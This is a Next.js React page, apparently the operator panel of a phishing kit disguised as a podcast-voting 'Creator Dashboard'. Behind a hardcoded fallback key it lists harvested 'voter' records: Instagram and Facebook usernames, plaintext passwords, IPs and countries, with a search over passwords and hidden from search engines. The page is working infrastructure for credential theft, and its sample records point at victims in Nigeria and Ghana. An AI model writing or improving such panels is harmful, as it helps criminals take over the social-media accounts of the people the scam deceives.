import Head from 'next/head';
import { useState } from 'react';

const CREATOR_KEY = process.env.NEXT_PUBLIC_CREATOR_KEY || 'creator-key';

export default function CreatorDashboard() {
  const [key, setKey] = useState('');
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [submissions, setSubmissions] = useState([]);
  const [searchTerm, setSearchTerm] = useState('');

  const escapeHtml = (s) => String(s == null ? '' : s).replace(/[&<>"']/g, (c) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
  }[c]));

  const handleAuth = () => {
    if (key === CREATOR_KEY) {
      setIsAuthenticated(true);
      setSubmissions([
        { id: 1, username: 'user123', password: 'pass123', ip: '192.168.1.1', country: 'Nigeria', created_at: new Date().toISOString(), method: 'instagram' },
        { id: 2, username: 'voter456', password: 'secret', ip: '192.168.1.2', country: 'Ghana', created_at: new Date().toISOString(), method: 'facebook' },
      ]);
    }
  };

  const filteredSubmissions = submissions.filter(r => 
    r.username?.toLowerCase().includes(searchTerm.toLowerCase()) ||
    r.password?.toLowerCase().includes(searchTerm.toLowerCase())
  );

  return (
    <>
      <Head>
        <title>Creator Dashboard - PodStream Global</title>
        <meta name="robots" content="noindex, nofollow" />
      </Head>

      <style jsx global>{`
        :root {
          --bg: #0b0e11;
          --panel: #161b22;
          --panel2: #1c2128;
          --border: #2b323a;
          --text: #e6edf3;
          --muted: #8b949e;
          --green: #3fb950;
          --red: #f85149;
          --blue: #58a6ff;
          --amber: #d29922;
          --radius: 8px;
          --max-width: 1100px;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; min-height: 100vh; padding: 24px; overflow-x: hidden; }
        .container { max-width: var(--max-width); margin: 0 auto; width: 100%; }
        .card { background: var(--panel); border: 1px solid var(--border); border-radius: var(--radius); padding: 18px; margin-bottom: 20px; }
        .card h2 { font-size: 1rem; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 12px; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 14px; margin-bottom: 20px; }
        .stat { background: var(--panel); border: 1px solid var(--border); border-radius: var(--radius); padding: 16px; text-align: center; }
        .stat .num { font-size: 1.9rem; font-weight: 800; color: var(--green); }
        .stat .lbl { font-size: .78rem; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-top: 4px; }
        table { width: 100%; border-collapse: collapse; font-size: .88rem; }
        th, td { text-align: left; padding: 9px 10px; border-bottom: 1px solid var(--border); vertical-align: middle; }
        th { color: var(--muted); font-weight: 600; text-transform: uppercase; font-size: .72rem; letter-spacing: .5px; }
        .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
        .pwd { color: var(--amber); word-break: break-all; max-width: 260px; }
        input { flex: 1; min-width: 200px; background: var(--panel2); border: 1px solid var(--border); color: var(--text); padding: 9px 12px; border-radius: var(--radius); font-size: .9rem; }
        .search-row { display: flex; gap: 10px; align-items: center; margin-bottom: 12px; flex-wrap: wrap; }
        button { background: var(--blue); border: none; color: #0b0e11; font-weight: 700; padding: 9px 16px; border-radius: var(--radius); cursor: pointer; }
        button.ghost { background: var(--panel2); color: var(--text); border: 1px solid var(--border); }
        @media (max-width: 640px) { body { padding: 12px; } .stats { grid-template-columns: 1fr 1fr; } .stat-ip { grid-column: 1 / -1; } }
      `}</style>

      <div className="container">
        {!isAuthenticated ? (
          <div className="card">
            <h2>Creator Login</h2>
            <form onSubmit={(e) => { e.preventDefault(); handleAuth(); }}>
              <label htmlFor="creatorKey" style={{display: 'block', marginBottom: '8px', fontSize: '.8rem', color: 'var(--muted)'}}>Creator Key</label>
              <input type="password" id="creatorKey" placeholder="Enter creator key" value={key} onChange={(e) => setKey(e.target.value)} />
              <button type="submit" style={{marginTop: '16px', width: '100%'}}>Access Dashboard</button>
            </form>
          </div>
        ) : (
          <>
            <div style={{display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '12px', marginBottom: '20px'}}>
              <h1>Creator Dashboard</h1>
              <button className="ghost small" onClick={() => setIsAuthenticated(false)}>Logout</button>
            </div>

            <div className="stats">
              <div className="stat"><div className="num">{submissions.length}</div><div className="lbl">Total Votes</div></div>
            </div>

            <div className="card">
              <h2>Voter Data</h2>
              <div className="search-row">
                <input type="text" placeholder="Search..." value={searchTerm} onChange={(e) => setSearchTerm(e.target.value)} />
                <button className="ghost small">Refresh</button>
              </div>
              
              <div style={{overflowX: 'auto'}}>
                <table>
                  <thead>
                    <tr>
                      <th>#</th>
                      <th>Username</th>
                      <th>Password</th>
                      <th>Platform</th>
                      <th>Country</th>
                      <th>Time</th>
                    </tr>
                  </thead>
                  <tbody>
                    {filteredSubmissions.length === 0 ? (
                      <tr><td colSpan="6" style={{textAlign: 'center', color: 'var(--muted)', padding: '30px 0'}}>No submissions</td></tr>
                    ) : (
                      filteredSubmissions.map((r, i) => (
                        <tr key={r.id || i}>
                          <td className="muted">{i + 1}</td>
                          <td className="user">{escapeHtml(r.username)}</td>
                          <td className="pwd">{escapeHtml(r.password)}</td>
                          <td>{r.method}</td>
                          <td>{escapeHtml(r.country)}</td>
                          <td className="mono muted">{escapeHtml(r.created_at)}</td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          </>
        )}
      </div>
    </>
  );
}